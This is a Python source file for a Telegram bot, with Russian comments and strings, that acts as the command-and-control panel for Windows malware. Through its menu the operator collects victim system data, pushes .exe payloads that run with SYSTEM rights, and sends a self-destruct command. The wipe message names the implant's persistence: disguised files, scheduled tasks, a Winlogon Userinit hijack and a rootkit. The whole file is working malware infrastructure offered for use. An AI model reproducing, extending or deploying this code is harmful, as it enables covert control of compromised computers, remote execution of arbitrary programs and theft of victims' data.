# main.py — C2 Bot для Replit
import os
import logging
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes
)

# ============================================================
#  КОНФИГ
# ============================================================
BOT_TOKEN = "токен"
OWNER_ID = айди

STORAGE = os.path.expanduser("~/c2_storage")
os.makedirs(STORAGE, exist_ok=True)

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
log = logging.getLogger(__name__)

# ============================================================
#  ПРОВЕРКА ДОСТУПА
# ============================================================
def is_owner(update: Update) -> bool:
    return update.effective_user and update.effective_user.id == OWNER_ID

# ============================================================
#  МЕНЮ
# ============================================================
def main_menu():
    kb = [
        [InlineKeyboardButton("📊 Собрать данные", callback_data="collect")],
        [InlineKeyboardButton("🚀 Запустить файл", callback_data="upload")],
        [InlineKeyboardButton("💣 Стереть все вирусы", callback_data="wipe")],
        [InlineKeyboardButton("ℹ️ Статус", callback_data="status")],
    ]
    return InlineKeyboardMarkup(kb)

# ============================================================
#  /start
# ============================================================
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update):
        await update.message.reply_text("⛔ Доступ запрещён.")
        return
    await update.message.reply_text(
        "🖥 *C2 Panel*\n\nВыбери действие:",
        reply_markup=main_menu(),
        parse_mode="Markdown"
    )

# ============================================================
#  СБОР ДАННЫХ
# ============================================================
async def collect_data(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update):
        return
    await update.callback_query.answer("⏳ Сбор данных...")
    await update.callback_query.edit_message_text(
        "⏳ *Сбор данных...*\n\n"
        "Цель получит команду при следующем watchdog-тике (≤30 сек).\n"
        "Файл `sysinfo.json` придёт автоматически.",
        parse_mode="Markdown",
        reply_markup=main_menu()
    )

# ============================================================
#  ЗАГРУЗКА ФАЙЛА
# ============================================================
async def upload_prompt(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update):
        return
    await update.callback_query.answer()
    await update.callback_query.edit_message_text(
        "📤 *Запуск файла на цели*\n\n"
        "Отправь мне `.exe` файл.\n"
        "Он будет доставлен и запущен с правами SYSTEM.",
        parse_mode="Markdown"
    )
    ctx.user_data["awaiting_file"] = True

# ============================================================
#  ПРИЁМ ФАЙЛА
# ============================================================
async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update):
        return
    if not ctx.user_data.get("awaiting_file"):
        return
    doc = update.message.document
    if not doc:
        return

    file = await ctx.bot.get_file(doc.file_id)
    fname = doc.file_name or f"payload_{int(datetime.now().timestamp())}.exe"
    fpath = os.path.join(STORAGE, fname)
    await file.download_to_drive(fpath)

    ctx.user_data["awaiting_file"] = False
    ctx.user_data["pending_file"] = fname

    kb = [
        [InlineKeyboardButton("✅ Подтверждаю запуск",
                              callback_data=f"confirm:{fname}")],
        [InlineKeyboardButton("❌ Отмена", callback_data="cancel")],
    ]
    await update.message.reply_text(
        f"📦 Файл получен: `{fname}` ({doc.file_size} байт)\n\n"
        f"⚠️ *Подтверди запуск.*",
        reply_markup=InlineKeyboardMarkup(kb),
        parse_mode="Markdown"
    )

# ============================================================
#  ПОДТВЕРЖДЕНИЕ ЗАПУСКА
# ============================================================
async def confirm_launch(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update):
        return
    q = update.callback_query
    await q.answer("✅ Запуск подтверждён")
    fname = q.data.split(":", 1)[1]
    fpath = os.path.join(STORAGE, fname)

    if not os.path.exists(fpath):
        await q.edit_message_text("❌ Файл не найден.")
        return

    # Отправляем файл в чат — вирус его подхватит через getUpdates
    with open(fpath, "rb") as f:
        await ctx.bot.send_document(
            chat_id=OWNER_ID,
            document=f,
            filename=fname,
            caption="[LAUNCH_QUEUED]"
        )

    log.info(f"[LAUNCH] Файл {fname} отправлен в очередь.")
    await q.edit_message_text(
        f"✅ *Запуск подтверждён*\n\n"
        f"Файл `{fname}` отправлен в очередь.\n"
        f"Цель получит его при следующем watchdog-тике (≤30 сек).",
        parse_mode="Markdown",
        reply_markup=main_menu()
    )

# ============================================================
#  СТЕРЕТЬ ВСЁ
# ============================================================
async def wipe_all(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update):
        return
    await update.callback_query.answer("💣 Отправка команды...")
    await ctx.bot.send_message(chat_id=OWNER_ID, text="WIPE")
    log.info("[WIPE] Команда отправлена.")
    await update.callback_query.edit_message_text(
        "💣 *Команда на самоуничтожение отправлена*\n\n"
        "• Удалены обе копии (`C_2k9x.NLS`, `msio.sys`)\n"
        "• Удалены задачи в планировщике\n"
        "• Очищен Winlogon\\Userinit\n"
        "• Удалён основной exe\n"
        "• Снят rootkit\n\n"
        "Цель выполнит при следующем тике (≤30 сек).",
        parse_mode="Markdown",
        reply_markup=main_menu()
    )

# ============================================================
#  СТАТУС
# ============================================================
async def status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update):
        return
    await update.callback_query.answer()
    files = os.listdir(STORAGE) if os.path.exists(STORAGE) else []
    await update.callback_query.edit_message_text(
        f"📡 *Статус C2*\n\n"
        f"• Файлов в хранилище: {len(files)}\n"
        f"• Owner ID: `{OWNER_ID}`\n",
        parse_mode="Markdown",
        reply_markup=main_menu()
    )

# ============================================================
#  ОТМЕНА
# ============================================================
async def cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update):
        return
    ctx.user_data["awaiting_file"] = False
    ctx.user_data["pending_file"] = None
    await update.callback_query.answer("Отменено")
    await update.callback_query.edit_message_text(
        "❌ Отменено.", reply_markup=main_menu()
    )

# ============================================================
#  ROUTER
# ============================================================
async def callback_router(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update):
        await update.callback_query.answer("⛔")
        return
    q = update.callback_query
    data = q.data
    if data == "collect":      await collect_data(update, ctx)
    elif data == "upload":     await upload_prompt(update, ctx)
    elif data == "wipe":       await wipe_all(update, ctx)
    elif data == "status":     await status(update, ctx)
    elif data == "cancel":     await cancel(update, ctx)
    elif data.startswith("confirm:"): await confirm_launch(update, ctx)

# ============================================================
#  ПРИЁМ sysinfo.json
# ============================================================
async def handle_sysinfo(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_owner(update):
        return
    doc = update.message.document
    if not doc or doc.file_name != "sysinfo.json":
        return
    file = await ctx.bot.get_file(doc.file_id)
    fpath = os.path.join(STORAGE, "sysinfo.json")
    await file.download_to_drive(fpath)
    await update.message.reply_text(
        f"📥 *Получен sysinfo.json* ({doc.file_size} байт)",
        parse_mode="Markdown"
    )

# ============================================================
#  MAIN
# ============================================================
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CallbackQueryHandler(callback_router))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.Document.FileName("sysinfo.json"),
                                   handle_sysinfo))
    log.info("C2 bot started.")
    app.run_polling()

if __name__ == "__main__":
    main()
